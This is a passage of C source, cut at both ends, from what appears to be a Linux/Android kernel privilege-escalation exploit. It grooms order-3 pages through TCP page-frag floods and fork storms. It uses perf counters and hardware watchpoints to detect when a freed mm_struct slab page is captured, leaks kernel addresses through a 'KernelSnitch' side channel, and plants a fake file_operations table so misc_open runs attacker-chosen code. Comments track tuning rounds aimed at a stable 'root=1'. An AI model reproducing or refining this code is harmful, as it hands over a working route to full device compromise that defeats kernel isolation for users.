          w->n, w->ctrl_fd >= 0, w->est_pfn, kmin, kmax, k_fixed);
}

static void ks_tp_read_win(struct tp_win *w) {
  if (w->ctrl_fd >= 0) {
    ioctl(w->ctrl_fd, PERF_EVENT_IOC_DISABLE, 0);
    uint64_t cnt = 0;
    ssize_t r = read(w->ctrl_fd, &cnt, sizeof(cnt));
    close(w->ctrl_fd);
    w->ctrl_fd = -1;
    w->ctrl_hits = (r == (ssize_t)sizeof(cnt)) ? (long long)cnt : -1;
  }
  if (w->ord3_fd >= 0) {
    ioctl(w->ord3_fd, PERF_EVENT_IOC_DISABLE, 0);
    uint64_t cnt = 0;
    ssize_t r = read(w->ord3_fd, &cnt, sizeof(cnt));
    close(w->ord3_fd);
    w->ord3_fd = -1;
    w->ord3_hits = (r == (ssize_t)sizeof(cnt)) ? (long long)cnt : -1;
  }
  for (int i = 0; i < w->n; i++) {
    ioctl(w->cand_fd[i], PERF_EVENT_IOC_DISABLE, 0);
    uint64_t cnt = 0;
    ssize_t r = read(w->cand_fd[i], &cnt, sizeof(cnt));
    close(w->cand_fd[i]);
    w->cand_fd[i] = -1;
    w->cand_hits[i] = (r == (ssize_t)sizeof(cnt)) ? (long long)cnt : -1;
    w->cand_hits3[i] = -1;
    if (w->cand_fd3[i] >= 0) {
      ioctl(w->cand_fd3[i], PERF_EVENT_IOC_DISABLE, 0);
      cnt = 0;
      r = read(w->cand_fd3[i], &cnt, sizeof(cnt));
      close(w->cand_fd3[i]);
      w->cand_fd3[i] = -1;
      w->cand_hits3[i] = (r == (ssize_t)sizeof(cnt)) ? (long long)cnt : -1;
    }
  }
}

/* best order-3-only hit: the gate oracle (fix37) */
static long long ks_tp_best3(const struct tp_win *w, unsigned long *pfn_out) {
  long long best = 0;
  if (pfn_out) *pfn_out = 0;
  for (int i = 0; i < w->n; i++) {
    if (w->cand_hits3[i] > best) {
      best = w->cand_hits3[i];
      if (pfn_out) *pfn_out = w->cand_pfn[i];
    }
  }
  return best;
}

static long long ks_tp_best(const struct tp_win *w, unsigned long *pfn_out) {
  long long best = 0;
  if (pfn_out) *pfn_out = 0;
  for (int i = 0; i < w->n; i++) {
    if (w->cand_hits[i] > best) {
      best = w->cand_hits[i];
      if (pfn_out) *pfn_out = w->cand_pfn[i];
    }
  }
  return best;
}

/* fix38: non-destructive per-send scan (read() on a counting fd does not
 * stop the counter).  Returns index of the first candidate fd whose count
 * went >0, or -1; snapshots the running order-3 total into *ord3_out. */
static int ks_tp_scan_hit(struct tp_win *w, long long *ord3_out) {
  long long o3 = -1;
  if (w->ord3_fd >= 0) {
    uint64_t cnt = 0;
    if (read(w->ord3_fd, &cnt, 8) == 8) o3 = (long long)cnt;
  }
  if (ord3_out) *ord3_out = o3;
  for (int i = 0; i < w->n; i++) {
    if (w->cand_fd[i] < 0) continue;
    uint64_t cnt = 0;
    if (read(w->cand_fd[i], &cnt, 8) == 8 && cnt > 0) return i;
  }
  return -1;
}

/* fix40: order-3-only hit scan.  During phase-2 our task's order-3
 * allocs are exactly the TCP page-frag refills plus kmalloc-4k slab
 * growth for the skb linear heads; BOTH carry our stream tiles at
 * object+0x180 (frag pages: buf[0x1000] lands at page+0x180; slab
 * pages: each 4k head object starts with buf[0..0xe80), table origin
 * at buf[0x180]).  Order-0/1 hits (skbuff_head_cache order-1 slabs,
 * misc allocs) are excluded -- they caused the fix36 false passes. */
static int ks_tp_scan_hit3(struct tp_win *w, long long *ord3_out) {
  long long o3 = -1;
  if (w->ord3_fd >= 0) {
    uint64_t cnt = 0;
    if (read(w->ord3_fd, &cnt, 8) == 8) o3 = (long long)cnt;
  }
  if (ord3_out) *ord3_out = o3;
  for (int i = 0; i < w->n; i++) {
    if (w->cand_fd3[i] < 0) continue;
    uint64_t cnt = 0;
    if (read(w->cand_fd3[i], &cnt, 8) == 8 && cnt > 0) return i;
  }
  return -1;
}

static void ks_tp_log_win(const char *tag, struct tp_win *w) {
  unsigned long bp = 0, bp3 = 0;
  long long best = ks_tp_best(w, &bp);
  long long best3 = ks_tp_best3(w, &bp3);
  pr_info("fix36 %s tp ctrl=%lld ord3=%lld best=%lld best_pfn=%lu best3=%lld "
          "best3_pfn=%lu n=%d\n",
          tag, w->ctrl_hits, w->ord3_hits, best, bp, best3, bp3, w->n);
  for (int i = 0; i < w->n; i++) {
    if (w->cand_hits[i] > 0 || w->cand_hits3[i] > 0) {
      long k = ((long)w->cand_pfn[i] - (long)w->est_pfn) / (1L << 18);
      pr_info("fix36 %s tp HIT pfn=%lu hits=%lld ord3=%lld k=%ld\n", tag,
              w->cand_pfn[i], w->cand_hits[i], w->cand_hits3[i], k);
    }
  }
}

/*
 * fix43: phase2 send context + thread.  Runs the TCP send loop on a
 * FRESH pthread so current->task_frag starts NULL (page=NULL) and every
 * order-3 frag refill is a new page at offset 0.  The main thread's
 * task_frag is dirty from phase1 unix sends + the shaping send; sharing
 * it made the captured page's content start at an arbitrary offset X
 * and page+0x180 (the route's fake_fops slot) landed mid-table.
 *
 * IMPORTANT: the perf order-3 counters (ks_tp_arm_win) and hardware
 * watchpoints (wp_arm) are opened with pid=0, which counts ONLY the
 * calling task.  Arming them on the main thread and sending from a
 * worker made ord3=0 / wp hits=-1 even when capture was real.  The
 * thread therefore arms its own counters BEFORE the first send and
 * reads them AFTER the last send.
 */
struct phase2_send_ctx {
  int *keep_cli;
  int nconn;
  struct msghdr *msg;
  size_t send_size;
  uintptr_t base;
  struct tp_win tpw2;
  int wp_fd_nonce;
  int wp_fd_open;
  int wp_fd_sent;
  int short_sends;
  int hit_idx_out;
  int total_ok;
  int last_err;
  int hit_c;
  int hit_i;
  int hit_idx;
  long long hit_ord3_at;
  int gsend;
  unsigned long long hit_cum;
  unsigned long long hit_s;
  unsigned long long hit_s_next;
  int have_s_next;
  long long wp_n;
  long long wp_o;
  long long wp_s;
  int stop_after_hit;
};

/* fix46 pin-coverage floor: data-carrying keep conns required before the
 * outer phase-2 loop stops after a hit.  7 = round 4's winning shape
 * (stopped at conn=6, window lived to root=1); rounds stopping at
 * conn=0 reclaimed the victim page inside 5s. */
#ifndef KS_FIX46_MIN_CONNS
#define KS_FIX46_MIN_CONNS 7
#endif

static void *phase2_send_thread(void *arg) {
  struct phase2_send_ctx *ctx = (struct phase2_send_ctx *)arg;
  /* Arm perf + watchpoints on THIS task so pid=0 counters see our allocs. */
  ks_tp_arm_win(&ctx->tpw2, ctx->base, -1);
  wp_arm(ctx->wp_fd_nonce);
  wp_arm(ctx->wp_fd_open);
  wp_arm(ctx->wp_fd_sent);
    for (int c = 0; c < ctx->nconn; c++) {
      int ok = 0;
      unsigned long long cum = 0;
      /* fix51: 112 sends x 32KB = 3.5MB, below the 4.3MB tcp_rmem[2]
       * drop threshold.  224 was 7MB and overflowed, letting the kernel
       * drop the victim skb and free the page before the open. */
      for (int i = 0; i < 112; i++) {
      errno = 0;
      ssize_t s = sendmsg(ctx->keep_cli[c], ctx->msg, MSG_DONTWAIT);
      if (s <= 0) {
        ctx->last_err = errno;
        break;
      }
      if ((size_t)s != ctx->send_size) {
        ctx->short_sends++;
        pr_warning("phase2 SHORT send conn=%d i=%d s=%zd want=%zu\n", c, i, s,
                   ctx->send_size);
      }
      if (ctx->hit_c == c && ctx->hit_i + 1 == i) {
        ctx->hit_s_next = (unsigned long long)s;
        ctx->have_s_next = 1;
      }
      if (ctx->hit_c < 0) {
        int idx = ks_tp_scan_hit3(&ctx->tpw2, &ctx->hit_ord3_at);
        if (idx >= 0) {
          ctx->hit_c = c;
          ctx->hit_i = i;
          ctx->hit_idx = idx;
          ctx->hit_idx_out = idx;
          ctx->hit_cum = cum;
          ctx->hit_s = (unsigned long long)s;
        }
      }
      cum += (unsigned long long)s;
      ok++;
      ctx->gsend++;
      /* fix46: once the (drained, sole-candidate) hit is in hand the
       * victim page is captured and pinned; stop flooding so the walk
       * cannot reach the watermark tail and pick up a second candidate
       * (which the gate would reject as contamination). */
      if (ctx->stop_after_hit && ctx->hit_c >= 0 && ctx->have_s_next)
        break;
    }
    pr_info("phase2 conn[%d] sends ok=%d\n", c, ok);
    ctx->total_ok += ok;
    if (ctx->stop_after_hit && ctx->hit_c >= 0 && ctx->have_s_next &&
        c + 1 >= KS_FIX46_MIN_CONNS) {
      /* fix46 + pin coverage (rounds 63/64): stopping at the hit conn
       * alone leaves the other keep conns EMPTY, so the victim page's
       * physical neighbours are free and the kernel reclaims the victim
       * within ~5s (window table dead at +.4s before conv; abort).  Round
       * 4 stopped at conn=6 = 7 data-carrying conns, its skb data pinned
       * the neighbours, and the window lived past +12s to root=1 with
       * tp_nhit2==1.  Keep flooding until 7 conns carry data (the hit
       * conn itself already stopped in the inner loop); per-conn volume
       * stays <=3.5MB < tcp_rmem max 4.5MB (fix51), so no trim. */
      pr_info("phase2 stop after hit conn=%d send=%d (fix46)\n", ctx->hit_c,
              ctx->hit_i);
      break;
    }
  }
  /* Read counters on this task before exit. */
  ks_tp_read_win(&ctx->tpw2);
  ctx->wp_n = wp_hits(ctx->wp_fd_nonce, "nonce");
  ctx->wp_o = wp_hits(ctx->wp_fd_open, "open");
  ctx->wp_s = wp_hits(ctx->wp_fd_sent, "sentinel");
  if (ctx->wp_fd_nonce >= 0) close(ctx->wp_fd_nonce);
  if (ctx->wp_fd_open >= 0) close(ctx->wp_fd_open);
  if (ctx->wp_fd_sent >= 0) close(ctx->wp_fd_sent);
  ctx->wp_fd_nonce = ctx->wp_fd_open = ctx->wp_fd_sent = -1;
  return NULL;
}

/*
 * fix46: order-3 hold-drain.  The intermittent route panic is a capture
 * LOTTERTY: the pfn-grid gate (fix37/38) passes on ANY armed candidate
 * order-3 alloc hit, and with the full grid armed a coincidental hit on a
 * NON-victim candidate (~1-8%) lets the route jump through stale garbage
 * at base -> misc_open panics.  The fix40 free-side k_true pin is blind
 * on this kernel (RCU offloads mm frees to rcuop kthreads; pid=0
 * counters never see them, and system-wide counters are EACCES for
 * uid2000).
 *
 * Cure by construction: BEFORE the victim slab can discard, HOLD every
 * free order-3 page (TCP loopback page-frag flood, sockets kept open so
 * the frags pin the pages).  After the kill storm the buddy's only free
 * order-3 pages are the storm's own mm-slab discards -- of which exactly
 * ONE (the victim) has a pfn on the candidate grid.  The phase-2 flood
 * then can only hit the victim's candidate: a hit IS the capture, and a
 * miss/contamination aborts safely (gate refuses) instead of panicking.
 * The watermark floor keeps a small tail of unreached free pages; the
 * early-break after the first hit (below) stops the flood before it
 * walks into that tail, so contamination (nhit>1) stays near zero.
 */
#define DRAIN_CONN_MAX 24
static int drain_cli[DRAIN_CONN_MAX];
static int drain_srv[DRAIN_CONN_MAX];
static int drain_nconn;
static int drain_held_pages;
static int drain_active;

static long order3_buddy_equiv(void) {
  FILE *f = fopen("/proc/buddyinfo", "r");
  if (!f) return -1;
  char line[512];
  long total = 0;
  while (fgets(line, sizeof(line), f)) {
    char *z = strstr(line, "zone ");
    if (!z) continue;
    char zname[16];
    int c[11];
    if (sscanf(z + 5, "%15s %d %d %d %d %d %d %d %d %d %d %d", zname, &c[0],
               &c[1], &c[2], &c[3], &c[4], &c[5], &c[6], &c[7], &c[8], &c[9],
               &c[10]) != 12)
      continue;
    if (!strcmp(zname, "DMA")) continue;
    for (int o = 3; o <= 10; o++)
      total += (long)c[o] << (o - 3);
  }
  fclose(f);
  return total;
}

static void order3_drain_hold(void) {
  const char *de = getenv("KS_ORDER3_DRAIN");
  if (de && de[0] && (!strcmp(de, "0") || !strcasecmp(de, "false") ||
                      !strcasecmp(de, "no"))) {
    pr_info("order3 drain disabled (KS_ORDER3_DRAIN)\n");
    return;
  }
  int target = 16;
  const char *te = getenv("KS_ORDER3_DRAIN_TARGET");
  if (te && te[0]) target = atoi(te);
  int max_pages = 8192;
  const char *me = getenv("KS_ORDER3_DRAIN_MAX");
  if (me && me[0]) max_pages = atoi(me);
  long pre = order3_buddy_equiv();
  unsigned char *buf = malloc(ORDER3_SIZE);
  if (!buf) {
    pr_warning("order3 drain: malloc failed\n");
    return;
  }
  memset(buf, 0x42, ORDER3_SIZE);
  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = buf;
  iov.iov_len = ORDER3_SIZE;
  struct msghdr dmsg;
  memset(&dmsg, 0, sizeof(dmsg));
  dmsg.msg_iov = &iov;
  dmsg.msg_iovlen = 1;
  int stalls = 0;
  long last_eq = pre;
  while (drain_held_pages < max_pages && drain_nconn < DRAIN_CONN_MAX &&
         stalls < 3) {
    long eq = order3_buddy_equiv();
    if (eq >= 0 && eq <= target) break;
    int lst = socket(AF_INET, SOCK_STREAM, 0);
    if (lst < 0) break;
    int one = 1;
    setsockopt(lst, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in laddr;
    memset(&laddr, 0, sizeof(laddr));
    laddr.sin_family = AF_INET;
    laddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    socklen_t alen = sizeof(laddr);
    if (bind(lst, (struct sockaddr *)&laddr, sizeof(laddr)) != 0 ||
        getsockname(lst, (struct sockaddr *)&laddr, &alen) != 0 ||
        listen(lst, 1) != 0) {
      close(lst);
      break;
    }
    int cli = socket(AF_INET, SOCK_STREAM, 0);
    if (cli < 0) {
      close(lst);
      break;
    }
    int snd = 16 << 20;
    setsockopt(cli, SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
    int fl = fcntl(cli, F_GETFL, 0);
    if (fl >= 0) fcntl(cli, F_SETFL, fl | O_NONBLOCK);
    connect(cli, (struct sockaddr *)&laddr, sizeof(laddr));
    int srv = accept(lst, NULL, NULL);
    close(lst);
    if (srv < 0) {
      close(cli);
      break;
    }
    int rcv = 32 << 20;
    setsockopt(srv, SOL_SOCKET, SO_RCVBUF, &rcv, sizeof(rcv));
    /* Lift both ends above the pselect fd sweep (chain14 dup2 bug). */
    for (int e = 0; e < 2; e++) {
      int fd = e ? srv : cli;
      int lifted = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 64);
      if (lifted < 0) {
        pr_warning("order3 drain fd lift errno=%d\n", errno);
      } else {
        close(fd);
        if (e) srv = lifted;
        else cli = lifted;
      }
    }
    int ok = 0;
    for (int i = 0; i < 1024; i++) {
      if (order3_buddy_equiv() >= 0 && order3_buddy_equiv() <= target) break;
      ssize_t s = sendmsg(cli, &dmsg, MSG_DONTWAIT);
      if (s <= 0) break;
      ok++;
      drain_held_pages++;
    }
    drain_cli[drain_nconn] = cli;
    drain_srv[drain_nconn] = srv;
    drain_nconn++;
    long eq2 = order3_buddy_equiv();
    if (eq2 >= 0 && eq2 <= target) break;
    if (eq2 >= 0 && eq2 >= last_eq) stalls++;
    else stalls = 0;
    last_eq = eq2;
    pr_info("order3 drain conn=%d sent=%d held=%d buddy %ld->%ld\n",
            drain_nconn - 1, ok, drain_held_pages, eq, eq2);
  }
  drain_active = 1;
  long post = order3_buddy_equiv();
  pr_info("order3 drain done conns=%d pages=%d buddy %ld->%ld target=%d\n",
          drain_nconn, drain_held_pages, pre, post, target);
  free(buf);
}

static void order3_drain_release(void) {
  if (!drain_active) return;
  for (int i = 0; i < drain_nconn; i++) {
    if (drain_cli[i] >= 0) close(drain_cli[i]);
    if (drain_srv[i] >= 0) close(drain_srv[i]);
    drain_cli[i] = drain_srv[i] = -1;
  }
  pr_info("order3 drain release conns=%d pages=%d buddy=%ld\n", drain_nconn,
          drain_held_pages, order3_buddy_equiv());
  drain_nconn = 0;
  drain_held_pages = 0;
  drain_active = 0;
}

uintptr_t prepare_kernel_page(int payload_mode) {
  size_t mm_struct_sz = runtime_mm_struct_sz();
  mm_objs_per_slab = ORDER3_SIZE / mm_struct_sz;
  pr_info("prepare_kernel_page payload=%d mm_struct_sz=%#zx "
          "mm_objs_per_slab=%zu order3_size=%#zx\n",
          payload_mode, mm_struct_sz, mm_objs_per_slab, (size_t)ORDER3_SIZE);
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  /* fork storm pacing: 1088+ back-to-back clone+memfd spikes the load
   * average into the hang-detect watchdog within ~1s (three straight
   * reboots died exactly here: "pipe child ctx prep=1088" as the last
   * line).  Bleed the burst every 128 children; 50ms per batch adds
   * ~0.5s total but keeps the instantaneous fork rate under the
   * threshold that killed the previous rounds. */
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
    if ((i & 127) == 127)
      usleep(50000);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
    if ((i & 63) == 63)
      usleep(30000);
  }

  ks = setup_kernelsnitch_runtime();

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  /* DO NOT kill pre/post/spray children yet.  On this kernel /proc/PID/mem
   * does NOT pin the mm_struct (FMODE_UNSIGNED_OFFSET causes immediate
   * mmput in proc_mem_open), so killing the child here frees its mm_struct
   * via RCU immediately.  The pre children share the victim's slab
   * (mm_objs_per_slab-1 objects); killing them early means the slab has
   * 33 free + 1 live (victim) = partial, parked on the SLUB partial list
   * and never reaching the buddy.  Keep them alive (they're in pause())
   * so their mm_structs stay allocated until we explicitly free them
   * AFTER the victim close + RCU flush.  This guarantees the entire slab
   * empties at once and takes the discard-to-buddy arm. */
  SYSCHK(waitpid(child_leak, NULL, 0));

  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("KernelSnitch collision finding failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  ks_layout_infer_from_leak(base);
  uintptr_t phys_probe = data_addr(ASHMEM_MISC_FOPS);
  long long base_delta = (long long)(base - phys_probe);
  pr_info("prepare_kernel_page base=%p phys_probe=%p delta=%lld (%.1fGB)\n",
          (void *)base, (void *)phys_probe, base_delta,
          (double)base_delta / (1024.0 * 1024.0 * 1024.0));
  if (base < phys_probe - 0x400000000ULL || base > phys_probe + 0x400000000ULL) {
    pr_warning("prepare_kernel_page leak outside physmap, discard base=%p\n",
               (void *)base);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
  if (!prepare_skb_payload(base, payload_mode)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  /*
   * Free the prepare children FIRST: their ~32 pages of mm_struct objects
   * empty out and raise nr_partial well above min_partial (~5).  Only then
   * drop the KernelSnitch helpers, so the leaked victim page's slab — when
   * it finally empties — takes the "discard to buddy" arm (nr_partial is
   * already high) instead of being parked on the partial list.  On a fresh
   * boot the old order (KSNITCH cleanup first) emptied the victim page
   * while nr_partial was still ~0, so SLUB parked it and the reclaim frag
   * could never get it (payload_base pointed at stale mm garbage ->
   * misc_open jumped through a garbage ->open -> kernel_panic,null).
   * Tier-0 cannot shrink the cache (EACCES), so this ordering is the only
   * lever that makes the victim page reach the buddy/pcp.
   */
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.memfds[i] > 0) {
      close(prepare_ctx.memfds[i]);
      prepare_ctx.memfds[i] = -1;
    }
  }
  /* DO NOT kill prepare children yet.  Their mm_structs must stay
   * allocated (slabs still partial) until AFTER the victim page empties,
   * so nr_partial stays high when the victim slab takes the discard arm.
   * Killing them here would empty their ~32 slabs, discard them to buddy,
   * drop nr_partial, and then the victim slab would get parked.  The
   * kill is moved to just before close(memfd_leak) below. */
  if (ks) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
  }
  ks_watch_frees_start(base);

  /*
   * The victim mm_struct's order-3 slab page empties out here, but slub
   * parks empty slabs on the cpu_partial (13) and node min_partial (5)
   * lists instead of returning them to the buddy, so the reclaim frag
   * can never get it (payload verify keeps reading the stale mm content
   * -> open=8).  Shrinking the cache force-drops every empty mm slab to
   * the buddy while the free-watch is armed, which both feeds the
   * reclaim sends and proves the watch actually fires.
   */
  {
    shrink_mm_slab("post-prepare");
  }

  close_reclaim_sockets();
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  /*
   * Root cause of every chain10-13 window death: open_selected_fds()
   * (fops.c:497) dup2()s the pselect rw fd over EVERY fd < 320 carrying an
   * in/out/ex bit.  The reclaim ends lived down there, so the route
   * silently closed them -- the payload skbs were purged, the pinned page
   * dropped to the buddy (rxq 655360 became the rw socket's 1-byte 'X';
   * CFI/physrw readbacks still passed because a freed page keeps its
   * bytes), and the window fork's first mm wave then memset it to zero.
   * Lift both ends above the sweep range, same trick as pselect_rw_fd().
   */
  for (int i = 0; i < 2; i++) {
    int lifted = fcntl(reclaim_sv[i], F_DUPFD, PSELECT_ROUTE_NFDS + 64);
    if (lifted < 0) {
      pr_warning("reclaim fd lift %d errno=%d\n", i, errno);
    } else {
      close(reclaim_sv[i]);
      reclaim_sv[i] = lifted;
    }
  }
  /*
   * Socket buffers gate how many deterministic frags land in the buddy
   * window: with 1MB/4MB only ~57 of 128 sends got through (EAGAIN) and
   * the victim page capture rate stayed ~50%.  The Normal zone has ~350
   * free order-3 Movable pages on a fresh boot; getting ~350 frags into
   * the pcp gives ~63% capture odds, ~700 gives ~86%.  16MB/32MB lets
   * ~800 sends through without draining.
   */
  int sndbuf = 16 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  {
    int rcvbuf = 32 << 20;
    setsockopt(reclaim_sv[0], SOL_SOCKET, SO_RCVBUF, &rcvbuf,
               sizeof(rcvbuf));
    setsockopt(reclaim_sv[1], SOL_SOCKET, SO_RCVBUF, &rcvbuf,
               sizeof(rcvbuf));
  }
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  /*
   * Deterministic reclaim (KS_RECLAIM_DETERMINISTIC, auto-enabled with
   * KS_TIER0_ALLOW_UNVERIFIED).  fix43: send exactly ONE order-3 frag
   * (ORDER3_SIZE = 0x8000) per sendmsg.
   *
   * Kernel facts (disassembled from the stock 5.4.254-qgki boot, see
   * /tmp/opencode/tcpdisasm/):
   *   - tcp_sendmsg_locked calls sk_stream_alloc_skb(sk, 0, ...) --
   *     linear head is ONLY the TCP header (max_header = 0x140);
   *     availroom after skb_reserve is 0, so ALL payload goes into
   *     page frags.  The old "SKB_MAX_HEAD 0xe80 linear head" model
   *     was AF_UNIX (unix_stream_sendmsg), NOT TCP.
   *   - skb_page_frag_refill on this kernel tries ORDER-3 FIRST
   *     (alloc_pages order=3, size=0x8000) before falling back to
   *     order-0.  Each fresh order-3 page holds exactly one send.
   *   - current->task_frag is per-TASK.  Phase1 (1024 unix sends) and
   *     the shaping send advance the MAIN thread's task_frag to an
   *     arbitrary offset X.  Phase2 used to continue on that dirty
   *     task_frag, so the captured page's content started at offset X
   *     and page+0x180 (the route's fake_fops slot) landed mid-table
   *     -> garbage ->open -> panic.  fix43 runs phase2 on a FRESH
   *     thread whose task_frag starts NULL, so every refill is a new
   *     order-3 page at offset 0.
   *
    * Layout (fresh thread, send_size=0x8000):
    *   frag page content = buf[0, 0x8000) at page offset 0
    *   page+0x000 = buf[0x000] = lock/waiter scratch
    *   page+0x1000 = buf[0x1000] = fops table origin (FOPS_TABLE_OFF)
    *   page+0x1070 = buf[0x1070] = table->open = ASHMEM_OPEN
    *   payload_base = base (delta=0); fake_fops = base+0x1000.
    *   SKB_DATA_DELTA (-0xe80) is the NON-deterministic positioning
    *   constant for the old AF_UNIX reclaim path; deterministic mode
    *   overrides it to 0 in prepare_skb_payload() (fix44).  Do not
    *   conflate the two -- the -0xe80 layout assumes a linear skb head
    *   that TCP does not have.
    */
  int deterministic = env_on("KS_RECLAIM_DETERMINISTIC") ||
                      env_on("KS_TIER0_ALLOW_UNVERIFIED");
  size_t send_size = deterministic ? (size_t)ORDER3_SIZE : SKB_SEND_SIZE;
  if (deterministic)
    pr_info("reclaim deterministic send_size=%#zx (one order-3 frag)\n",
            send_size);

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = send_size;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  /*
   * The task_frag cache priming send must NOT carry the real payload fill:
   * pcp_shaping_sv is closed right after (releasing its skbs), so a page
   * it claimed keeps stale fill bytes that verify() reads as a landing
   * even though nothing pins the page any more -- the pipe waves then
   * recycle it into an mm slab and the planted fops table turns into mm
   * garbage (Chrome misc_open oops on owner=0x10, configfs ENOTTY for
   * us).  0x42 content makes verify fail instead of lying; if the freed
   * page is LIFO-reclaimed by the real sends, they refill it with the
   * correct fill anyway.
   */
  struct iovec shape_iov;
  memset(&shape_iov, 0, sizeof(shape_iov));
  unsigned char *shape_buf = malloc(SKB_SEND_SIZE);
  memset(shape_buf, 0x42, SKB_SEND_SIZE);
  shape_iov.iov_base = shape_buf;
  shape_iov.iov_len = send_size;
  struct msghdr shape_msg;
  memset(&shape_msg, 0, sizeof(shape_msg));
  shape_msg.msg_iov = &shape_iov;
  shape_msg.msg_iovlen = 1;
  SYSCHK(sendmsg(pcp_shaping_sv[0], &shape_msg, 0));
  free(shape_buf);

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  /*
   * DO NOT close pre/post/spray memfds yet.  Their mm_structs are
   * RCU-deferred; closing them here would free their pages in the same
   * RCU batch as the victim during the sendmsg syscalls, causing the
   * buddy allocator to coalesce the victim page with its neighbors
   * (capture=0 across all runs).  Close them AFTER the sends instead.
   */
  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  {
    long slabs = -1, objs = 0;
    if (read_mm_slab_row(&slabs, &objs) == 0)
      pr_info("slabinfo pre-teardown: slabs=%ld objs=%ld free=%ld\n",
              slabs, objs, slabs * (long)mm_objs_per_slab - objs);
  }
  /*
   * DO NOT kill prepare children yet.  Their mm_structs must stay
   * allocated (slabs still partial) until AFTER the victim page empties,
   * so nr_partial stays high when the victim slab takes the discard arm.
   * Killing them here would empty their ~32 slabs, discard them to buddy,
   * drop nr_partial, and then the victim slab would get parked.  More
   * importantly: killing prepare frees 22 order-3 pages to the buddy
   * BEFORE the victim page is freed.  When the victim page is later
   * freed, its physical neighbors are already free, so the buddy
   * allocator COALESCES the victim page into a higher-order block
   * (order-4/5/…) and our order-3 skb frag allocations never get it
   * (capture=0 across all runs: slab discarded but sends miss).
   * Keeping prepare alive pins the neighboring pages, preventing
   * coalescing.  The prepare slabs are partial (not empty), so
   * nr_partial stays elevated — the victim slab still takes the
   * discard arm when it empties.
   */
  /* fix42: the pre-children kill is MOVED to after the kill storm (see
   * below).  pre_ctx's 33 objects share the victim's slab; killing them
   * here (as fix41 did) frees them in the same RCU batch as the victim,
   * emptying the victim's page while nr_partial is still ~0 -> SLUB
   * parks the empty page on the partial list and it NEVER reaches the
   * buddy (fix41: free=0 until the storm, then the victim page parked).
   * Keeping the pre-children alive through the storm pins the victim's
   * slab as a NORMAL partial (33 live + 1 free victim) so it cannot be
   * parked; the storm's own kills empty the OTHER slabs and raise
   * nr_partial; only THEN do we drop the pre-children, whose frees
   * empty the victim page onto an already-high nr_partial ->
   * discard-to-buddy arm. */
  /* Close the victim pin (memfd_leak) BEFORE the send loop.  The
   * mm_struct free is call_rcu-deferred; the RCU callback fires during
   * the subsequent sendmsg syscalls, discarding the victim slab to the
   * buddy.  Because prepare is still alive and post/spray pins are
   * open, the victim page's neighbors are still allocated → no
   * coalescing → the page stays at the head of the order-3 free list
   * and the next send captures it. */
  {
    long slabs = -1, objs = 0;
    if (read_mm_slab_row(&slabs, &objs) == 0)
      pr_info("slabinfo before victim-close: slabs=%ld objs=%ld free=%ld\n",
              slabs, objs, slabs * (long)mm_objs_per_slab - objs);
  }
  /* fix40: arm the mm_page_free pfn oracles BEFORE dropping the victim
   * pin.  The victim's order-3 discard fires in our task context during
   * the kill storm; exactly one candidate k matching pins k_true, which
